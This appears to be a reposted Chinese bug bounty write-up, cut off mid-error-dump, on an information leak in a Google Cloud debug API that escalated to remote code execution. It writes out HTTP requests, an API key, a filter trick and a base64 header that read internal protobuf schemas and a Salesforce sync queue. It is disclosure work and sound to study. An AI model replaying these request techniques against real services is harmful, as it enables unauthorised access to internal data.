---
title: StubZero：谷歌云生产环境中的RCE漏洞
url: https://mp.weixin.qq.com/s/8EmKtZsBbKTpkeE4OWZmyw
source: Doonsec's feed
date: 2026-05-23
fetch_date: 2026-05-24T05:59:09.086626
---

# StubZero：谷歌云生产环境中的RCE漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/TKdPSwEibsZh7jjbMeK0tCtJo3RaQa1cGrqpLMDc0e1pucECxpU9AnD3vbeBzy0TKxN0Yuq8qOia77IC3LJtOcZIFFLYIDnia49ibI2DIgfzPlE/0?wx_fmt=jpeg)

# StubZero：谷歌云生产环境中的RCE漏洞

原创

骨哥说事
骨哥说事

骨哥说事

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

|  |
| --- |
| ****声明：****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 |

#

#

# **防走失：****https://gugesay.com/**

**不想错过任何消息？设置星标****↓ ↓ ↓**

#

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg)

这原本是一个调试端点信息泄露问题，最终升级为谷歌云生产环境中的完全远程代码执行。三个月后，它再次发生。该漏洞被分配为 **CVE-2026-2031**。

故事始于我的一个自动化模糊测试工具，它提醒我注意 API **cloudcrmipfrontend-pa.googleapis.com**，因为它对一些可疑的端点返回了状态 200。经过进一步检查，这个 API 似乎有几个公开的调试端点：

![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZiagpFQJgbUn5zdNTjkHJEjkderOic9wcycLdxDR0eSvscIxxOXtTfgHRlqSFU4wlZ670ibMfNcrFEHjCszVteoExTBjIZJwUtmC8/640?wx_fmt=png&from=appmsg)

*截图来自我为从 discovery document 测试谷歌内部 API 而构建的内部 API 浏览器工具*

### “即服务式” req2proto

像 `GET /v1/integrationPlatform:listServicesByServer` 这样的端点似乎总是返回内部服务器错误。然而，端点 `/v1/integrationPlatform:getProtoDefinition` 似乎可以返回 **google3（谷歌内部源代码单仓库）中任意 protobuf 消息的原型定义**，甚至包括像 YouTube 这样不相关的服务。

**请求**

```
GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2
Host: cloudcrmipfrontend-pa.clients6.google.com
Cookie: <已移除>
Authorization: SAPISIDHASH <已移除>
Origin: https://console.cloud.google.com
X-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
```

> 对于此 API 的身份验证，我们使用的是谷歌专有的第一方身份验证。这涉及你的谷歌账户 cookie 头以及一个使用 `SAPISID` cookie 和列入白名单的源 **https://console.cloud.google.com**计算出的 Authorization 头部值 。

**响应**

```
{
  "protoDescriptor": {
    "name": "InnerTubeContext",
    "field": [
      {
        "name": "client",
        "number": 1,
        "label": "LABEL_OPTIONAL",
        "type": "TYPE_MESSAGE",
        "typeName": ".youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo",
        "jsonName": "client"
      },
      {
        "name": "user",
        "number": 3,
        "label": "LABEL_OPTIONAL",
        "type": "TYPE_MESSAGE",
        "typeName": ".youtube.api.pfiinnertube.YoutubeApiInnertube.UserInfo",
        "jsonName": "user"
      },
...
```

这是巨大的发现，因为在谷歌，一切都基于原型 (proto) 。所有 API 在内部都定义为使用 Protocol Buffers (protobuf) 的 gRPC 服务，这本质上允许泄露任何端点的请求/响应体，对于像谷歌这样的黑盒目标来说，这简直是座金矿。

过去，我曾为此开发过一个工具 req2proto ，但是该工具仅限于查找请求体的原型，不包括响应体，并且它假设 API 支持 JSPB (application/json+protobuf) ，而大多数 API 并不支持。作为一个玩笑，我和朋友们从那时起开始称这个端点为“即服务式 req2proto”，因为它实际上就是这个工具的托管版，且功能更强大。

在进一步探测此端点之前，我检查了是否有其他泄露信息的端点。

### 泄露内部工作流执行队列

![](https://mmbiz.qpic.cn/mmbiz_jpg/TKdPSwEibsZiaxLicgx9HTAdeTk3sia4fwLtS1pb1V5NoU0jaiaqymvmevnD6FrCachyTOBU5oxtXRDVXicpe7m0XSI9fmdWYl4ciaJY51zaA5ncOQ/640?wx_fmt=jpeg&from=appmsg)

最初，没有设置任何查询参数时，此端点只是返回 **INVALID\_ARGUMENT** 错误。尝试像 `*` 这样的过滤器也不起作用。然而，根据以往经验，这些过滤参数通常允许按照 https://google.aip.dev/160 进行任何过滤。

因此，尝试将 `client_id > "123"` 作为过滤器后，我得到了一个有趣的响应：

```
{
  "error": {
    "code": 500,
    "message": "Failed to convert server response to JSON",
    "status": "INTERNAL"
  }
}
```

看起来它试图给我的任何响应都没有 JSON 映射。然而，Google API 支持通过标准的 `?alt=` 参数更改响应内容类型。例如，`?alt=proto` 将以 Protocol Buffers (protobuf) 格式返回输出。

唯一的问题是，由于我们使用谷歌专有的第一方身份验证（Cookie 和 Authorization 头部）进行认证，我们必须向主机名 **cloudcrmipfrontend-pa.clients6.google.com** 发送请求，而不是 `cloudcrmipfrontend-pa.googleapis.com`，但是谷歌不允许发送到 \*.google.com 的请求返回原始 protobuf 响应：

```
Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.com
```

幸运的是，有办法解决这个问题。我们可以使用头部 `X-Goog-Encode-Response-If-Executable: base64`，这样就能以 base64 编码获取响应，而不是二进制数据：

```
GET /v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto HTTP/2
Host: cloudcrmipfrontend-pa.clients6.google.com
Cookie: <已移除>
Authorization: SAPISIDHASH <已移除>
Origin: https://console.cloud.google.com
X-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
X-Goog-Encode-Response-If-Executable: base64
```

API 返回了一个很大的 base64 编码的 protobuf 响应。利用之前获取的原型定义泄露来检索 `ListQuotaQueueResponse` 的模式，我能够正确解码，结果显示这是某种内部工作流执行队列，其中包含将数据从 Spanner 同步到 Salesforce 的工作流：

```
{
  "queue_items": [
    {
      "queued_request": {
        "queued_request_id": "75a885e2-c611-43f7-b4e2-ae0d87bae789",
        "client_id": "default",
        "workflow_name": "WriteToSfdc",
        "priority": "CRITICAL",
        "received_timestamp": 1763057385562,
        "event_execution_info_id": "615cd9a9-9c0e-46ec-90df-91ee42ec9c37"
      },
      "event_execution_info": {
        "client_id": "default",
        "workflow_name": "WriteToSfdc",
        "trigger_id": "api_trigger/WriteToSfdc",
        ...
        "type_url": "type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest",
        ...
        "sfdc_object": {
          "vector_account": {
            "id": "001Kf00000wjeK3IAI",
            "due_diligence__c": "Pending",
            "due_diligence_sub_status__c": "1. PENDING DD - Initial Submission Review"
            ...
```

这之后不久，我就这些漏洞提交了一份报告。仅仅几个小时后，它就被标记为 P0/S0 并获得了🎉 **Nice catch**！

### 进一步升级？

在这一切之后，我确信这个 API 中可能还有更多发现，于是我开始查看所有的工作流端点。该 API 似乎与谷歌云的 Application Integration 相关。

它允许你定义一个“工作流 (workflow)”，你可以为其提供一个 `triggerConfig` 来指定触发条件，以及一个 `taskConfig` 来指定应触发的任务。最有趣的部分是，查看发现文档时，似乎暗示存在一个名为 `GenericStubbyTypedTask` 的任务，你似乎可以配置工作流来执行它，这立刻拉响了警报。

```
"EnterpriseCrmEventbusProtoTaskUiModuleConfig": {
"description": "Task author would use this type to configure a config module.",
"id": "EnterpriseCrmEventbusProtoTaskUiModuleConfig",
"properties": {
    "moduleId": {
      "description": "ID of the config module.",
      "enum": [
        ...
        "RPC_TYPED",
        ...
      ],
      "enumDescriptions": [
        ...
        "Configures a GenericStubbyTypedTask.",
        ...
      ],
    }
  }
},
```

根据 Google 的 SRE 书籍：

> 谷歌的所有服务都使用名为 Stubby 的远程过程调用 (RPC) 基础设施进行通信；开源版本 gRPC 可用。通常，即使需要在本地程序中调用子例程，也会进行 RPC 调用。这使得在需要更多模块化或服务器代码库增长时，更容易将调用重构到不同的服务器中。

根据我对工作原理的理解，Borg（即 Google 生产环境）遵循一个安全模型，其中每个 borgtask 服务都有自己的身份。当你向 `*.googleapis.com` 端点发送请求时，前端服务使用其自身的生产服务身份向后台服务发起 Stubby 调用，同时在安全凭证中携带你的最终用户上下文。如果凭证包含你的 Gaia 用户 ID，后台服务会以该用户身份授权该请求。以下是来自 Google API 错误响应的两个泄露的安全凭证示例：

未经身份验证（匿名）

```
com.google.apps.framework.auth.IamPermissionDeniedException:
  IAM authority does not have the permission 'cloudprivatecatalog.targets.get'
  required for action PrivateCatalogV1Beta1-SearchProducts
  on resource ''.Explanation:
Security Context:  ValidatedSecurityContextWithSystemAuthorizationPolicy    delegate = ValidatedSecurityContextWithRegistryHandle      delegate = ValidatedSecurityContextWithObligations        delegate = ValidatedIamSecurityContext          user  = anonymous          creds = EndUserCreds            loggable_credential {              type: SERVICE_CONTROL_TOKEN            }            access_assertion: ANONYMOUS          peer =            protocol                = loas            psp_version             = 0            level                   = strong_privacy_and_integrity            host                    = jxcbu6.prod.google.com            is_authenticated_host   = false            role                    = cloud-commerce-catalog            user                    = cloud-boq-clientapi-catalog            is_delegated            = true            jobname_chosen_by_user  = prod.cloud-commerce-catalog          InternalIAMIdentity            log = originator {              scope: MDB_USER              mdb_user {                user_name: "cloud-boq-clientapi-catalog"              }            }
```

使用第一方身份验证（Gaia 用户）

```
com.google.apps.framework.auth.IamPermissionDeniedException:
  IAM authority does not have the permission 'resourcemanager.projects.get'
  required for action GetServiceAccessStatus
  on resource 'projects/613988253758'.Explanation:
Security Context:  ValidatedSecurityContextWithCloudPolicyChecks    delegate = ValidatedSecurityContextWithCpeContext      delegate = ValidatedSecurityContextWithObligation...